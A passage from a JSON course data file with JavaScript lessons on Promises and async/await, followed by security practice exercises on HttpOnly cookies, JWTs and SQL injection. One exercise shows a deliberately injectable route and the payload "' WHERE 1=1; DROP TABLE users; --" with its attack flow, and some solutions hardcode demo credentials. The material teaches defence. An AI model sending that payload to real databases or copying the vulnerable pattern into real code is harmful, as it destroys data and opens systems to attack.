response does not exist yet when the function returns. The Promise object exists to represent that eventual value and to route the result to the right handler when it does arrive.","text":"A function that makes an HTTP request cannot return the response directly — the response does not exist yet when the function returns. The Promise object exists to represent that eventual value and to route the result to the right handler when it does arrive."},{"kind":"checkpoint","q":"If you call both `resolve('A')` and `reject('B')` inside the same executor, what gets logged by the `.then(onFulfilled, onRejected)` handler — and why?","a":"Only `'A'` is logged. `resolve('A')` settles the Promise first — state transitions to fulfilled immediately. `reject('B')` arrives after settlement and is silently ignored. Settlement is permanent; the second call has no effect."},{"kind":"h2","html":"The constructor and executor","text":"The constructor and executor"},{"kind":"p","html":"Creating a Promise looks like this:","text":"Creating a Promise looks like this:"},{"kind":"code","lang":"js","code":"let promise = new Promise((resolve, reject) =\u003e {\n  // executor body\n  resolve('Done!');\n});"},{"kind":"p","html":"You pass one function — the \u003cstrong\u003eexecutor\u003c/strong\u003e — to \u003ccode\u003enew Promise()\u003c/code\u003e. JavaScript calls that executor immediately when the Promise is constructed, before the next synchronous statement runs. The runtime provides two arguments: \u003ccode\u003eresolve\u003c/code\u003e and \u003ccode\u003ereject\u003c/code\u003e. Call \u003ccode\u003eresolve(value)\u003c/code\u003e to signal success; call \u003ccode\u003ereject(reason)\u003c/code\u003e to signal failure.","text":"You pass one function — the **executor** — to `new Promise()`. JavaScript calls that executor immediately when the Promise is constructed, before the next synchronous statement runs. The runtime provides two arguments: `resolve` and `reject`. Call `resolve(value)` to signal success; call `reject(reason)` to signal failure."},{"kind":"p","html":"The executor runs \u003cstrong\u003eeagerly\u003c/strong\u003e. &quot;Eagerly&quot; means right now, synchronously, on the call stack. Nothing defers it.","text":"The executor runs **eagerly**. \"Eagerly\" means right now, synchronously, on the call stack. Nothing defers it."},{"kind":"h2","html":"The three states","text":"The three states"},{"kind":"p","html":"Every Promise begins in the \u003cstrong\u003epending\u003c/strong\u003e state. It transitions to exactly one other state:","text":"Every Promise begins in the **pending** state. It transitions to exactly one other state:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eEvent\u003c/th\u003e\n\u003cth\u003eNew state\u003c/th\u003e\n\u003cth\u003eHandler that fires\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eresolve(value)\u003c/code\u003e called\u003c/td\u003e\n\u003ctd\u003e\u003cstrong\u003efulfilled\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e.then(onFulfilled)\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ereject(reason)\u003c/code\u003e called\u003c/td\u003e\n\u003ctd\u003e\u003cstrong\u003erejected\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e.catch(onRejected)\u003c/code\u003e or \u003ccode\u003e.then(null, onRejected)\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Once a Promise leaves pending it is \u003cstrong\u003esettled\u003c/strong\u003e. Settlement is final — state never changes again.","text":"Once a Promise leaves pending it is **settled**. Settlement is final — state never changes again."},{"kind":"code","lang":"js","code":"let promise = new Promise((resolve, reject) =\u003e {\n  reject('Rejected!');   // settles the promise immediately\n  resolve('Resolved!'); // ignored — already settled\n});\n\npromise.then(\n  (value)  =\u003e { console.log(value); },  // never fires\n  (reason) =\u003e { console.log(reason); }  // logs 'Rejected!'\n);"},{"kind":"p","html":"\u003ccode\u003eresolve\u003c/code\u003e and \u003ccode\u003ereject\u003c/code\u003e are \u003cstrong\u003emutually exclusive\u003c/strong\u003e — only the first call that settles the Promise matters. Every subsequent call to either function is silently ignored.","text":"`resolve` and `reject` are **mutually exclusive** — only the first call that settles the Promise matters. Every subsequent call to either function is silently ignored."},{"kind":"h2","html":"Executor timing vs handler timing","text":"Executor timing vs handler timing"},{"kind":"p","html":"The executor is synchronous. The \u003ccode\u003e.then()\u003c/code\u003e handler is not.","text":"The executor is synchronous. The `.then()` handler is not."},{"kind":"code","lang":"js","code":"const fn1 = () =\u003e new Promise((resolve, reject) =\u003e {\n  console.log(1);       // executor — runs NOW (eager, sync)\n  resolve('success');   // enqueues .then callback to microtask queue\n});\n\nfn1().then((res) =\u003e {\n  console.log(res);     // runs AFTER 'start' — microtask, not sync\n});\n\nconsole.log('start');   // runs synchronously, before microtask drains\n// Output: 1, start, success"},{"kind":"p","html":"\u003ccode\u003eresolve()\u003c/code\u003e does not call the \u003ccode\u003e.then()\u003c/code\u003e handler directly. It changes the Promise&#39;s state, then JavaScript enqueues the handler in the \u003cstrong\u003emicrotask queue\u003c/strong\u003e. That queue drains only after the current synchronous call stack is empty.","text":"`resolve()` does not call the `.then()` handler directly. It changes the Promise's state, then JavaScript enqueues the handler in the **microtask queue**. That queue drains only after the current synchronous call stack is empty."},{"kind":"checkpoint","q":"What is the output of the code above, and why does `'start'` print before `'success'`?","a":"Output is `1`, `start`, `success`. `1` prints immediately because the executor runs eagerly. `resolve('success')` enqueues the `.then` callback as a microtask — it does not run yet. `console.log('start')` runs next because it is synchronous. Only after the call stack empties does the microtask queue drain, printing `'success'`."},{"kind":"h2","html":"What happens if resolve is never called","text":"What happens if resolve is never called"},{"kind":"p","html":"If the executor never calls \u003ccode\u003eresolve()\u003c/code\u003e or \u003ccode\u003ereject()\u003c/code\u003e, the Promise stays pending forever. Every \u003ccode\u003e.then()\u003c/code\u003e or \u003ccode\u003e.catch()\u003c/code\u003e chain attached to it is silently skipped.","text":"If the executor never calls `resolve()` or `reject()`, the Promise stays pending forever. Every `.then()` or `.catch()` chain attached to it is silently skipped."},{"kind":"code","lang":"js","code":"let promise = new Promise((resolve, reject) =\u003e {\n  console.log('executor ran'); // prints\n  // resolve and reject never called\n});\n\npromise.then(() =\u003e console.log('then ran')); // never prints\n// Promise state: pending"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eStudents often expect \u003ccode\u003e.then()\u003c/code\u003e to fire immediately when \u003ccode\u003eresolve()\u003c/code\u003e is called. \u003ccode\u003eresolve()\u003c/code\u003e only \u003cem\u003eenqueues\u003c/em\u003e the handler. The handler fires after the current synchronous call stack empties — not inline. Any synchronous code after the \u003ccode\u003enew Promise(...)\u003c/code\u003e expression runs before any \u003ccode\u003e.then()\u003c/code\u003e callback, even if \u003ccode\u003eresolve()\u003c/code\u003e was called inside the executor.\u003c/p\u003e","text":"Students often expect `.then()` to fire immediately when `resolve()` is called. `resolve()` only *enqueues* the handler. The handler fires after the current synchronous call stack empties — not inline. Any synchronous code after the `new Promise(...)` expression runs before any `.then()` callback, even if `resolve()` was called inside the executor."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e \u003ccode\u003enew Promise(executor)\u003c/code\u003e runs the executor immediately and synchronously. The executor calls \u003ccode\u003eresolve\u003c/code\u003e or \u003ccode\u003ereject\u003c/code\u003e to settle the Promise. Settlement is permanent — only the first call counts. \u003ccode\u003e.then()\u003c/code\u003e and \u003ccode\u003e.catch()\u003c/code\u003e handlers are microtasks: they run after all synchronous code in the current call stack, not at the moment \u003ccode\u003eresolve\u003c/code\u003e or \u003ccode\u003ereject\u003c/code\u003e is called.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":28,"id":"promise-chaining","title":".then() Chaining, .catch(), and .finally()","hook":"Callback hell collapses to a readable pipeline once you know that .then() always returns a new Promise.","tags":["then","catch","finally","chaining","microtask-queue"],"module":"Promises and Async Programming","source":"Slide 6, ISAQuiz9","blocks":[{"kind":"h2","html":"Why chaining exists","text":"Why chaining exists"},{"kind":"p","html":"Sequential async steps — fetch user, then fetch profile, then render — pile into nested callbacks. Each step must wait for the prior result, so nesting grows. Promise chaining solves this by making each \u003ccode\u003e.then()\u003c/code\u003e return a new Promise, letting you write the steps as a flat sequence.","text":"Sequential async steps — fetch user, then fetch profile, then render — pile into nested callbacks. Each step must wait for the prior result, so nesting grows. Promise chaining solves this by making each `.then()` return a new Promise, letting you write the steps as a flat sequence."},{"kind":"h2","html":"How .then() chaining works","text":"How .then() chaining works"},{"kind":"p","html":"\u003ccode\u003e.then()\u003c/code\u003e always returns a new Promise. That return value is what you call the next \u003ccode\u003e.then()\u003c/code\u003e on. The callback you pass to \u003ccode\u003e.then()\u003c/code\u003e receives the fulfilled value of the upstream Promise.","text":"`.then()` always returns a new Promise. That return value is what you call the next `.then()` on. The callback you pass to `.then()` receives the fulfilled value of the upstream Promise."},{"kind":"p","html":"Returning a plain value from a \u003ccode\u003e.then()\u003c/code\u003e callback fulfills the next Promise with that value. Throwing an error rejects it.","text":"Returning a plain value from a `.then()` callback fulfills the next Promise with that value. Throwing an error rejects it."},{"kind":"code","lang":"js","code":"new Promise(resolve =\u003e {\n  resolve(1);\n})\n.then(a =\u003e {\n  console.log('First:', a);   // First: 1\n  return a * 2;               // fulfills next Promise with 2\n})\n.then(b =\u003e {\n  console.log('Second:', b);  // Second: 2\n  return b * 3;               // fulfills next Promise with 6\n})\n.then(c =\u003e {\n  console.log('Final:', c);   // Final: 6\n});"},{"kind":"p","html":"Each \u003ccode\u003e.then()\u003c/code\u003e callback receives the return value of the previous one. Nothing inside the chain is synchronous — all three callbacks run as microtasks after the call stack empties.","text":"Each `.then()` callback receives the return value of the previous one. Nothing inside the chain is synchronous — all three callbacks run as microtasks after the call stack empties."},{"kind":"h2","html":".catch() — handling rejection","text":".catch() — handling rejection"},{"kind":"p","html":"\u003ccode\u003e.catch(fn)\u003c/code\u003e is shorthand for \u003ccode\u003e.then(undefined, fn)\u003c/code\u003e. Place it at the end of a chain to catch any rejection from any upstream step.","text":"`.catch(fn)` is shorthand for `.then(undefined, fn)`. Place it at the end of a chain to catch any rejection from any upstream step."},{"kind":"code","lang":"js","code":"const p = new Promise((resolve, reject) =\u003e {\n  const success = false;\n  if (success) resolve('Everything worked!');\n  else reject('Something went wrong');\n});\n\np.then(result =\u003e {\n  console.log('SUCCESS:', result);\n})\n.catch(error =\u003e {\n  console.log('ERROR:', error); // ERROR: Something went wrong\n});"},{"kind":"p","html":"Removing \u003ccode\u003e.catch()\u003c/code\u003e leaves the rejection unhandled — the runtime emits an unhandled-rejection error. Always attach a \u003ccode\u003e.catch()\u003c/code\u003e at the chain&#39;s end when rejection is possible.","text":"Removing `.catch()` leaves the rejection unhandled — the runtime emits an unhandled-rejection error. Always attach a `.catch()` at the chain's end when rejection is possible."},{"kind":"p","html":"A throw inside any \u003ccode\u003e.then()\u003c/code\u003e callback acts as a rejection and skips to the nearest downstream \u003ccode\u003e.catch()\u003c/code\u003e.","text":"A throw inside any `.then()` callback acts as a rejection and skips to the nearest downstream `.catch()`."},{"kind":"h2","html":".finally() — runs regardless of outcome","text":".finally() — runs regardless of outcome"},{"kind":"p","html":"\u003ccode\u003e.finally(f)\u003c/code\u003e runs \u003ccode\u003ef\u003c/code\u003e whether the Promise was fulfilled or rejected. The callback receives no value — \u003ccode\u003ef\u003c/code\u003e is called with \u003ccode\u003eundefined\u003c/code\u003e. After \u003ccode\u003e.finally()\u003c/code\u003e completes, the chain continues with the original fulfilled value or rejection reason, unless \u003ccode\u003e.finally()\u003c/code\u003e itself throws.","text":"`.finally(f)` runs `f` whether the Promise was fulfilled or rejected. The callback receives no value — `f` is called with `undefined`. After `.finally()` completes, the chain continues with the original fulfilled value or rejection reason, unless `.finally()` itself throws."},{"kind":"p","html":"Use \u003ccode\u003e.finally()\u003c/code\u003e for cleanup that must happen regardless of success or failure (closing connections, hiding spinners).","text":"Use `.finally()` for cleanup that must happen regardless of success or failure (closing connections, hiding spinners)."},{"kind":"checkpoint","q":"A `.then()` callback returns `num * 3`. What is the state of the Promise returned by that `.then()` call?","a":"Fulfilled, with the value `num * 3`. Returning a plain value from `.then()` resolves the new Promise with that value."},{"kind":"checkpoint","q":"A `.then()` callback contains `throw new Error('bad')`. Which handler runs next?","a":"The nearest downstream `.catch()`. Throwing inside `.then()` rejects the Promise that `.then()` returned."},{"kind":"h2","html":"Return vs. throw inside .then()","text":"Return vs. throw inside .then()"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eAction in \u003ccode\u003e.then()\u003c/code\u003e callback\u003c/th\u003e\n\u003cth\u003eEffect on the returned Promise\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ereturn value\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eFulfilled with \u003ccode\u003evalue\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ereturn anotherPromise\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAdopts the state of \u003ccode\u003eanotherPromise\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ethrow error\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eRejected with \u003ccode\u003eerror\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(no return)\u003c/td\u003e\n\u003ctd\u003eFulfilled with \u003ccode\u003eundefined\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"This mirrors try/catch: the \u003ccode\u003e.then()\u003c/code\u003e body is the try block; \u003ccode\u003e.catch()\u003c/code\u003e is the catch block.","text":"This mirrors try/catch: the `.then()` body is the try block; `.catch()` is the catch block."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003e.then()\u003c/code\u003e callbacks are microtasks — they drain completely before any \u003ccode\u003esetTimeout\u003c/code\u003e callback fires. If your chain includes \u003ccode\u003esetTimeout\u003c/code\u003e calls, every \u003ccode\u003e.then()\u003c/code\u003e in the entire chain runs before the first timeout handler executes, regardless of where the \u003ccode\u003esetTimeout\u003c/code\u003e appears in the code.\u003c/p\u003e","text":"`.then()` callbacks are microtasks — they drain completely before any `setTimeout` callback fires. If your chain includes `setTimeout` calls, every `.then()` in the entire chain runs before the first timeout handler executes, regardless of where the `setTimeout` appears in the code."},{"kind":"h2","html":"Promise.resolve() and Promise.reject() shortcuts","text":"Promise.resolve() and Promise.reject() shortcuts"},{"kind":"p","html":"\u003ccode\u003ePromise.resolve(value)\u003c/code\u003e creates an already-fulfilled Promise with \u003ccode\u003evalue\u003c/code\u003e. \u003ccode\u003ePromise.reject(reason)\u003c/code\u003e creates an already-rejected Promise. Both let you enter a chain without needing a full executor.","text":"`Promise.resolve(value)` creates an already-fulfilled Promise with `value`. `Promise.reject(reason)` creates an already-rejected Promise. Both let you enter a chain without needing a full executor."},{"kind":"code","lang":"js","code":"Promise.resolve(2)\n  .then(n =\u003e n * 3)  // 6\n  .then(n =\u003e n + 1)  // 7\n  .then(n =\u003e console.log(n)); // 7"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e \u003ccode\u003e.then()\u003c/code\u003e returns a new Promise — that single fact makes chaining possible. Return a value to pass it forward, throw to redirect to \u003ccode\u003e.catch()\u003c/code\u003e, and use \u003ccode\u003e.finally()\u003c/code\u003e for unconditional cleanup. Microtask callbacks always complete before any macrotask fires.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":29,"id":"async-await","title":"async/await: Cleaner Syntax Over Promises","hook":"Promise chains grow verbose fast. async/await gives you the same mechanism with synchronous-looking code.","tags":["async","await","promise","syntax"],"module":"Promises and Async Programming","source":"Slide 9, ISAQuiz8","blocks":[{"kind":"h2","html":"The Problem with Promise Chains","text":"The Problem with Promise Chains"},{"kind":"p","html":"Long \u003ccode\u003e.then()\u003c/code\u003e chains solve the callback problem but introduce their own verbosity.\n\u003ccode\u003easync/await\u003c/code\u003e is syntactic sugar over Promises — it does not replace them or change their behavior.\nEvery \u003ccode\u003easync function\u003c/code\u003e you write still returns a Promise under the hood.","text":"Long `.then()` chains solve the callback problem but introduce their own verbosity.\n`async/await` is syntactic sugar over Promises — it does not replace them or change their behavior.\nEvery `async function` you write still returns a Promise under the hood."},{"kind":"h2","html":"The async Keyword","text":"The async Keyword"},{"kind":"p","html":"Declaring a function \u003ccode\u003easync\u003c/code\u003e makes it automatically return a Promise wrapping its return value.\nThese two functions are equivalent:","text":"Declaring a function `async` makes it automatically return a Promise wrapping its return value.\nThese two functions are equivalent:"},{"kind":"code","lang":"js","code":"// Promise version\nfunction greet() {\n  return Promise.resolve(\"Hello\");\n}\n\n// async/await version — identical behavior\nasync function greet() {\n  return \"Hello\";\n}"},{"kind":"p","html":"Both return a Promise that fulfills with \u003ccode\u003e&quot;Hello&quot;\u003c/code\u003e.\nThe runtime wraps the bare return value in \u003ccode\u003ePromise.resolve()\u003c/code\u003e for you.","text":"Both return a Promise that fulfills with `\"Hello\"`.\nThe runtime wraps the bare return value in `Promise.resolve()` for you."},{"kind":"checkpoint","q":"What does an async function return when you invoke it?","a":"Always an object — specifically a Promise. Even if the function body returns a plain string, the caller receives a Promise."},{"kind":"h2","html":"The await Keyword","text":"The await Keyword"},{"kind":"p","html":"\u003ccode\u003eawait\u003c/code\u003e pauses the async function until the awaited Promise settles, then resumes with the fulfilled value.","text":"`await` pauses the async function until the awaited Promise settles, then resumes with the fulfilled value."},{"kind":"code","lang":"js","code":"async function loadUser() {\n  const response = await fetch(\"/api/user\"); // pauses here until fetch settles\n  const data = await response.json();        // pauses again\n  return data;\n}"},{"kind":"p","html":"\u003ccode\u003eawait\u003c/code\u003e does not block the JavaScript thread.\nOther code continues running while \u003ccode\u003eloadUser\u003c/code\u003e is paused at an \u003ccode\u003eawait\u003c/code\u003e expression.\nEach \u003ccode\u003eawait\u003c/code\u003e is equivalent to a \u003ccode\u003e.then()\u003c/code\u003e callback — the microtask queue still drives execution.","text":"`await` does not block the JavaScript thread.\nOther code continues running while `loadUser` is paused at an `await` expression.\nEach `await` is equivalent to a `.then()` callback — the microtask queue still drives execution."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003eawait\u003c/code\u003e is only valid inside an \u003ccode\u003easync\u003c/code\u003e function. Using it in a regular function causes a \u003ccode\u003eSyntaxError\u003c/code\u003e. Mark the enclosing function \u003ccode\u003easync\u003c/code\u003e before adding any \u003ccode\u003eawait\u003c/code\u003e.\u003c/p\u003e","text":"`await` is only valid inside an `async` function. Using it in a regular function causes a `SyntaxError`. Mark the enclosing function `async` before adding any `await`."},{"kind":"h2","html":"Error Handling","text":"Error Handling"},{"kind":"p","html":"\u003ccode\u003easync/await\u003c/code\u003e replaces \u003ccode\u003e.catch()\u003c/code\u003e with standard \u003ccode\u003etry/catch\u003c/code\u003e blocks.","text":"`async/await` replaces `.catch()` with standard `try/catch` blocks."},{"kind":"code","lang":"js","code":"async function loadUser() {\n  try {\n    const response = await fetch(\"/api/user\");\n    return await response.json();\n  } catch (err) {\n    console.error(\"Fetch failed:\", err);\n  }\n}"},{"kind":"p","html":"A rejected Promise inside \u003ccode\u003eawait\u003c/code\u003e throws into the \u003ccode\u003ecatch\u003c/code\u003e block.\nThis maps directly to the \u003ccode\u003e.catch()\u003c/code\u003e handler in a Promise chain.","text":"A rejected Promise inside `await` throws into the `catch` block.\nThis maps directly to the `.catch()` handler in a Promise chain."},{"kind":"h2","html":"Promise Chain vs async/await Side-by-Side","text":"Promise Chain vs async/await Side-by-Side"},{"kind":"code","lang":"js","code":"// Promise chain\nfunction getUsername() {\n  return fetch(\"/api/user\")\n    .then(response =\u003e response.json())\n    .then(data =\u003e data.name)\n    .catch(err =\u003e console.error(err));\n}\n\n// async/await — same behavior\nasync function getUsername() {\n  try {\n    const response = await fetch(\"/api/user\");\n    const data = await response.json();\n    return data.name;\n  } catch (err) {\n    console.error(err);\n  }\n}"},{"kind":"p","html":"Both functions return a Promise. Callers use them identically: \u003ccode\u003egetUsername().then(name =&gt; ...)\u003c/code\u003e.","text":"Both functions return a Promise. Callers use them identically: `getUsername().then(name =\u003e ...)`."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e \u003ccode\u003easync/await\u003c/code\u003e is syntactic sugar over Promises. An async function always returns a Promise (type: object). \u003ccode\u003eawait\u003c/code\u003e pauses the function — not the thread — until the Promise settles. Omitting \u003ccode\u003easync\u003c/code\u003e from a function that uses \u003ccode\u003eawait\u003c/code\u003e is a \u003ccode\u003eSyntaxError\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e"}]}],"practice":[{"kind":"code","variant":"starter-solution","n":1,"id":"httponly-cookies","title":"Set a secure HttpOnly cookie on login","lang":"js","tags":["HttpOnly","cookies","express","SameSite","Secure","withCredentials","CORS"],"source":"Slide 9, Slide 10","prompt_html":"\u003cp\u003eBuild an Express.js server with a \u003ccode\u003e/login\u003c/code\u003e POST endpoint. On successful credentials, set a cookie that: (a) is inaccessible to JavaScript, (b) is transmitted over HTTPS only, (c) allows cross-origin requests, (d) expires after 60 seconds. The client makes cross-origin XMLHttpRequest requests with withCredentials set to true, so the server must configure CORS credentials headers and handle OPTIONS preflight.\u003c/p\u003e","starter":"const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\n// TODO: add CORS middleware for cross-origin credential requests\n// TODO: handle OPTIONS preflight\n\napp.post('/login', (req, res) =\u003e {\n  const { username, password } = req.body;\n  // TODO: validate credentials\n  // TODO: set secure HttpOnly cookie\n});\n\napp.listen(3000);","solution":"const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.use((req, res, next) =\u003e {\n  res.setHeader('Access-Control-Allow-Origin', 'http://localhost');\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');\n  if (req.method === 'OPTIONS') return res.sendStatus(200);\n  next();\n});\n\napp.post('/login', (req, res) =\u003e {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'secret') {\n    res.setHeader(\n      'Set-Cookie',\n      'token=abc123; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=60'\n    );\n    res.json({ message: 'Login successful' });\n  } else {\n    res.status(401).json({ message: 'Invalid credentials' });\n  }\n});\n\napp.listen(3000);","why_html":"\u003cp\u003e\u003ccode\u003eHttpOnly\u003c/code\u003e blocks \u003ccode\u003edocument.cookie\u003c/code\u003e access in the browser, eliminating the attack surface for XSS-based token theft. \u003ccode\u003eSecure\u003c/code\u003e restricts the cookie to HTTPS. \u003ccode\u003eSameSite=None\u003c/code\u003e allows cross-origin cookie sending (required when client and server have different origins), but only works when \u003ccode\u003eSecure\u003c/code\u003e is also set. \u003ccode\u003eMax-Age=60\u003c/code\u003e sets a 60-second TTL. \u003ccode\u003eAccess-Control-Allow-Credentials: true\u003c/code\u003e tells the browser to actually send the cookie on cross-origin requests when the client uses \u003ccode\u003ewithCredentials: true\u003c/code\u003e — without it, the browser strips the cookie even with withCredentials set. Common wrong approach: storing the token in \u003ccode\u003elocalStorage\u003c/code\u003e — localStorage is readable by any same-origin JavaScript, making it vulnerable to XSS injection.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":2,"id":"jwt","title":"Sign and verify a JWT in Express.js","lang":"js","tags":["JWT","express","HS256","secret-key","httpOnly-cookie","environment-variable"],"source":"Slide 10","prompt_html":"\u003cp\u003eAn Express.js login endpoint must: (1) validate credentials, (2) sign a JWT with a secret key using HS256 with a 2-minute expiration, (3) return the JWT in an HttpOnly cookie. A separate \u003ccode\u003e/protected\u003c/code\u003e endpoint must verify the JWT from the cookie and respond with the decoded payload or a 401.\u003c/p\u003e","starter":"const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.use(express.json());\n\nconst TOKEN_SECRET = process.env.TOKEN_SECRET; // store in env\n\napp.post('/login', (req, res) =\u003e {\n  const { username, password } = req.body;\n  // TODO: validate, sign JWT, set httpOnly cookie\n});\n\napp.get('/protected', (req, res) =\u003e {\n  const token = req.cookies?.token;\n  // TODO: verify JWT and respond\n});\n\napp.listen(3000);","solution":"const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(express.json());\napp.use(cookieParser());\n\nconst TOKEN_SECRET = process.env.TOKEN_SECRET;\n\napp.post('/login', (req, res) =\u003e {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'secret') {\n    const token = jwt.sign({ username }, TOKEN_SECRET, {\n      algorithm: 'HS256',\n      expiresIn: '120s',\n    });\n    res.setHeader('Set-Cookie', `token=${token}; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=120`);\n    res.json({ message: 'Login successful' });\n  } else {\n    res.status(401).json({ message: 'Invalid credentials' });\n  }\n});\n\napp.get('/protected', (req, res) =\u003e {\n  const token = req.cookies?.token;\n  if (!token) return res.status(401).json({ message: 'No token' });\n  try {\n    const decoded = jwt.verify(token, TOKEN_SECRET);\n    res.json({ payload: decoded });\n  } catch {\n    res.status(401).json({ message: 'Invalid or expired token' });\n  }\n});\n\napp.listen(3000);","why_html":"\u003cp\u003e\u003ccode\u003ejwt.sign()\u003c/code\u003e with \u003ccode\u003ealgorithm: &#39;HS256&#39;\u003c/code\u003e and \u003ccode\u003eexpiresIn\u003c/code\u003e produces a signed, time-limited token the server can verify without storing session state. Storing the token in an HttpOnly cookie means JavaScript can never read it, blocking XSS-based token theft. Placing \u003ccode\u003eTOKEN_SECRET\u003c/code\u003e in an environment variable keeps it out of source code. Common wrong approaches: (1) signing with no \u003ccode\u003eexpiresIn\u003c/code\u003e — a stolen token never expires; (2) storing the JWT in \u003ccode\u003elocalStorage\u003c/code\u003e — readable by any injected script; (3) using a short, guessable secret like \u003ccode\u003e&#39;shhhhh!&#39;\u003c/code\u003e — HMAC security depends on secret length and randomness.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":3,"id":"api-security-best-practices","title":"Fix SQL injection in an Express.js update endpoint","lang":"js","tags":["SQL-injection","parameterized-queries","express","security"],"source":"Slide 12, ISAQuiz12 Q2","prompt_html":"\u003cp\u003eThe following Express.js route is vulnerable to SQL injection. Identify the vulnerability and rewrite the route to prevent it using parameterized queries.\u003c/p\u003e\n\u003cp\u003eThe route accepts a \u003ccode\u003euserId\u003c/code\u003e and \u003ccode\u003enewEmail\u003c/code\u003e from the request body and updates the user&#39;s email in the database. As written, an attacker can craft a \u003ccode\u003enewEmail\u003c/code\u003e value that contains arbitrary SQL — for example, \u003ccode\u003e&#39; WHERE 1=1; DROP TABLE users; --\u003c/code\u003e — and the database will execute the injected command.\u003c/p\u003e\n\u003cp\u003eYour task: rewrite the route so that user-supplied values are never embedded directly into the query string.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eAttack flow:\n\n  Client request body:\n  {\n    &quot;userId&quot;: 42,\n    &quot;newEmail&quot;: &quot;&#39; WHERE 1=1; DROP TABLE users; --&quot;\n  }\n\n          |\n          v\n\n  Server builds query string:\n  UPDATE users SET email=&#39;&#39; WHERE 1=1; DROP TABLE users; --&#39; WHERE id=42\n\n          |\n          v\n\n  Database executes:\n  1. UPDATE users SET email=&#39;&#39; WHERE 1=1  ← modifies all rows\n  2. DROP TABLE users                     ← deletes the table\n  3. Remainder ignored as comment\n\u003c/code\u003e\u003c/pre\u003e","starter":"const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst database = require('./database');\n\napp.use(bodyParser.json());\n\napp.put('/update-user', bodyParser.json(), (req, res) =\u003e {\n  const userId = req.body.userId;\n  const newEmail = req.body.newEmail;\n\n  const query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;\n  const result = database.query(query);\n\n  res.json(result);\n});\n\napp.listen(3000, () =\u003e {\n  console.log('Server listening on port 3000');\n});","solution":"const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst database = require('./database');\n\napp.use(bodyParser.json());\n\napp.put('/update-user', bodyParser.json(), (req, res) =\u003e {\n  const userId = req.body.userId;\n  const newEmail = req.body.newEmail;\n\n  const query = 'UPDATE users SET email=? WHERE id=?';\n  const result = database.query(query, [newEmail, userId]);\n\n  res.json(result);\n});\n\napp.listen(3000, () =\u003e {\n  console.log('Server listening on port 3000');\n});","why_html":"\u003cp\u003eTemplate-literal string interpolation embeds user input directly into the SQL string. An attacker sets \u003ccode\u003enewEmail\u003c/code\u003e to \u003ccode\u003e&#39; WHERE 1=1; DROP TABLE users; --\u003c/code\u003e to execute arbitrary SQL. Parameterized queries (\u003ccode\u003e?\u003c/code\u003e placeholders) separate the SQL structure from the data values — the database driver escapes substituted values as data, so injected SQL syntax never executes. The \u003ccode\u003e.replace()\u003c/code\u003e approach (removing quotes from input) fails because attackers use other characters or encodings to bypass it. The ISAQuiz12 Q2 exam question confirmed parameterized queries as the only correct fix.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":4,"id":"public-private-keys","title":"Trace the Amir→Tom asymmetric signing sequence","lang":"js","tags":["asymmetric","public-key","private-key","signing","RSA"],"source":"Slide 10, ISAQuiz11 Q9","prompt_html":"\u003cp\u003eAmir wants to send a message to Tom that satisfies two conditions: (1) only Tom can read it, and (2) Tom can verify it came from Amir and was not tampered with. Both parties have each other&#39;s public keys.\u003c/p\u003e\n\u003cp\u003eThe diagram below shows the double-envelope flow from Slide 10 (slides 7–8):\u003c/p\u003e\n\u003csvg viewBox=\"0 0 700 280\" 